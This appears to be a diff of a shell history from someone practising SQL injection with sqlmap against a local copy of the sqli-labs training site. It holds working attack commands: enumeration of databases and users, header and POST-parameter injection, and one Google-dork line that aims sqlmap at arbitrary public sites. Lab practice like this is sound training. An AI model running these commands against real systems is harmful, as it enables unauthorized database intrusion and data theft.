@@ -1,1 +1,36 @@
-111
+  321  sqlmap -h
+  322  sudo apt install sqlmap
+  323  clear
+  324  sqlmap -h
+  325  mysql
+  326  mysql -uroot -proot
+  327  mysql -v
+  328  sqlmap -d "mysql://root:root@169.254.231.23:3306" -f --banner
+  329  sqlmap -d "mysql://root:root@169.254.231.23:3306/test" -f --banner
+  330  sqlmap -d "mysql://root:root@169.254.231.23:3306/xiaoxiaoran" -f --banner
+  331  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --banner
+  332  sqlmap -l /home/xiaoxiaoran/temp/burpsuite_proxy_request.txt
+  333  vim /home/xiaoxiaoran/temp/burpsuite_proxy_request.txt
+  334  sqlmap -g "inurl:.php?id=1"
+  335  vim /etc/hosts
+  336  sudo vim /etc/hosts
+  337  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-11/index.php" --data="uname=admin&passwd=admin&submit=submit" -f --banner --dbs --users
+
+  390  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-11/index.php" --data="uname=admin&passwd=admin&submit=submit" -f --banner --dbs --users --param-del="&"
+  391  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-3/index.php" --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" --banner
+  392  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-3/index.php?id=1" --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" --banner
+  393  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-3/index.php?id=1" --random-agent --banner
+  394  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-4/index.php?id=1" --random-agent --banner
+  395  burpsuite
+  396  sqlmap -r /home/xiaoxiaoran/temp/burpsuite_proxy_referer.txt --level 3
+  397  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-18/index.php" 
+  398  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/index.php?id=1" --timeout 12  -f
+  399  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/index.php?id=1" --timeout 12  -f -dbs
+  400  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/index.php?id=1" --timeout 12  -f -dbs --randomize id
+  401  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/index.php?id=1" --timeout 12  -f -dbs --randomize id --banner
+  402  sqlmap -hh
+  403  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/index.php?id=1" --keep-alive --current-db
+  404  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/index.php?id=1" --current-db --null-connection
+  405  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/index.php?id=1" --current-db --null-connection --thread 10
+  406  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-4/index.php?id=1" --current-db --null-connection --predict-output
+
